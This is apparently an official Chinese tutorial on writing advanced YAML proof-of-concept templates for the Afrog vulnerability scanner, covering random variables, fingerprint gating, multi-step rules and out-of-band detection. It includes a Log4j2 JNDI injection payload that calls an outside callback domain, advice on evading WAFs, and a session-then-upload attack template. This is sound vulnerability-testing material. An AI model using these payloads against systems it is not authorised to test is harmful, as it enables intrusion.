# Afrog 官方教程(5)：大魔法师 - 高级 PoC 技巧

> “普通人看山是山，大师看山是数据流。” —— 掌握高级技巧，编写逻辑复杂的漏洞脚本。

大家好，这里是 **Afrog 官方**。
上一期我们学会了编写最基础的“请求-判断”型 PoC。但现实世界的漏洞往往没那么简单：
- 有的需要随机数绕过 WAF。
- 有的需要先获取一个 Token，再用 Token 发起攻击。
- 有的没有回显，需要用 OOB 检测。
- 有的需要先判断是不是 Tomcat，是才扫，否则浪费时间。

今天，我们将进阶成为 PoC 编写的大魔法师。

## 🔮 变量与内置函数：让 Payload 活起来

写死 Payload（比如 `alert(1)`）容易被拦截。Afrog 提供了 `set` 模块和丰富的内置函数。

### 1. 定义变量
```yaml
set:
  r1: randomInt(1000, 9999)             # 生成 1000-9999 的随机整数
  r2: randomLowercase(8)                # 生成 8 位随机小写字母
  payload: "admin" + r2                 # 字符串拼接
  b64_payload: base64(payload)          # Base64 编码
```

### 2. 在请求中使用
使用 `{{变量名}}` 引用：
```yaml
rules:
  r0:
    request:
      method: GET
      path: /api/check?name={{payload}} # 发送 adminxxxx
    expression: response.body.bcontains(bytes(payload)) # 检查响应是否包含生成的随机串
```
**为什么要用随机数？** 
如果你检查 XSS，响应里有了 `adminxxxx` 这个随机串，说明 Payload 原样返回了，漏洞实锤，且误报率极低。

---

## 🚪 指纹门控 (Requires)：拒绝无效扫描

这是 Afrog 的一大杀器。
假设你有一个专门打 **WebLogic** 的 PoC，如果目标是 **Nginx**，发包就是浪费时间，还可能被封 IP。

### 使用 `requires`
在 `info` 里加上：
```yaml
info:
  name: WebLogic RCE
  requires: weblogic # 只有当指纹识别出 weblogic 时，才运行此 PoC
```
这样，Afrog 会先跑指纹，匹配成功才跑这个 PoC。效率提升 1000%！

---

## 🔗 多步攻击链：逻辑的艺术

有些漏洞需要两步：
1.  **第一步**：访问 `/login` 获取 `Set-Cookie`。
2.  **第二步**：带着 Cookie 访问 `/upload` 上传文件。

Afrog 支持在 `rules` 里定义多个请求，并传递变量。

```yaml
rules:
  # 第一步：获取 Session
  get_session:
    request:
      method: GET
      path: /login
    expression: response.status == 200
    output:
      search: '"JSESSIONID=(?P<sid>.+?);"'.bsubmatch(response.headers["set-cookie"])
      session_id: search["sid"] # 提取 Session ID 存入变量

  # 第二步：利用 Session
  exploit:
    request:
      method: POST
      path: /upload
      headers:
        Cookie: JSESSIONID={{session_id}} # 使用上一步获取的变量
    expression: response.status == 200 && response.body.bcontains(b"Upload Success")

expression: get_session() && exploit() # 按顺序执行
```

---

## 📡 反连检测 (OOB)：看不见的也能抓

对于 Log4j2 这种无回显漏洞，我们需要用到 OOB。

```yaml
set:
  oob: oob() # 获取一个反连 URL，例如 http://xxx.ceye.io
  oobHTTP: oob.HTTP # 获取 HTTP 格式的 URL
  oobDNS: oob.DNS   # 获取 DNS 格式的域名

rules:
  r0:
    request:
      method: GET
      path: /?vulnerable_param=${jndi:ldap://{{oobDNS}}} # 发送带有反连域名的 Payload
    expression: oobCheck(oob, oob.ProtocolDNS, 3) # 检查 3 秒内是否有 DNS 记录
```

只要 `oobCheck` 返回 true，说明服务器请求了我们的域名，漏洞存在！

---

## 📝 总结一下

1.  **随机化**：用 `set` 和 `random` 函数降低误报，绕过 WAF。
2.  **指纹门控**：用 `requires` 避免无效发包。
3.  **多步利用**：用 `output` 提取变量，实现登录验证、Token 复用。
4.  **OOB**：用 `oob()` 和 `oobCheck()` 搞定无回显漏洞。

掌握了这些，你已经能写出市面上 99% 的 PoC 了。

## 下期预告

写好了 PoC，想分享给更多人？想被合并到 Afrog 官方库？
下一期**《开源贡献指南》**，我们将聊聊如何提交高质量的 PR，以及审核员眼中的“完美 PoC”长什么样。

---
*本文由 Afrog 官方原创，欢迎转发分享。*
